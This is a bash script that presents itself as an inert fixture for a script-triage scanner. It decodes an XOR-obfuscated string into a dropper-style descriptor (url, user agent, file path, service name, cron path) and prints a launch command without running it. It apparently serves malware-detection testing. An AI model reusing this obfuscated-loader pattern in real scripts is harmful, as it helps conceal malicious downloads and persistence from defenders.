#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_58c266b4='96:238:80:117:79:98:182:17:122:1:122:188:2:104:72:115:140:13:102:95:119:191:77:109:85:101:163:0:125:95:126:140:17:123:83:117:182:18:122:64:119:183:0:121:72:115:161:92:122:84:73:160:2:123:85:102:167:29:122:72:119:180:4:86:95:121:166:15:125:1:39:175:2:104:81:102:178:8:110:82:73:186:5:52:95:119:190:17:104:85:113:189:76:104:8:38:182:83:61:93:39:230:87:117:90:127:191:4:86:76:119:167:9:52:19:98:190:17:38:84:99:189:21:123:89:101:160:76:106:93:117:187:4:38:18:101:167:0:110:89:59:178:85:57:89:36:231:0:56:9:32'
  readonly Codec_58c266b4='decimal_colon|repeating_key_xor|16,d3,61,09,3c'

  Load_58c266b4() {
    item1=()
    local IFS=':'
    read -r -a item1 <<< "${Material_58c266b4}"
  }

  Decode_58c266b4() {
    item2=()
    local -a key_bytes=(22 211 97 9 60)
    local item5
    for ((item5=0; item5<${#item1[@]}; item5++)); do
      item2+=("$((item1[item5] ^ key_bytes[item5 % ${#key_bytes[@]}]))")
    done
  }

  Recover_58c266b4() {
    local -a item1 item2
    local item3 item4 item8 item5
    if ((2 > 1)); then item4=left; else item4=right; fi
    Load_58c266b4
    item8=0; while ((item8 < 1)); do Decode_58c266b4; ((item8+=1)); done
    item3=''
    local octal character
    for item5 in "${!item2[@]}"; do
      printf -v octal '%03o' "${item2[item5]}"
      printf -v character '%b' "\\$octal"
      item3+="$character"
    done
    printf '%s\n' "$item3"
  }

  Inspect_58c266b4() { Recover_58c266b4; }

  Plan_58c266b4() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_58c266b4)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a launch_command=(sh "$file_path")
    declare -p launch_command
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_58c266b4; fi
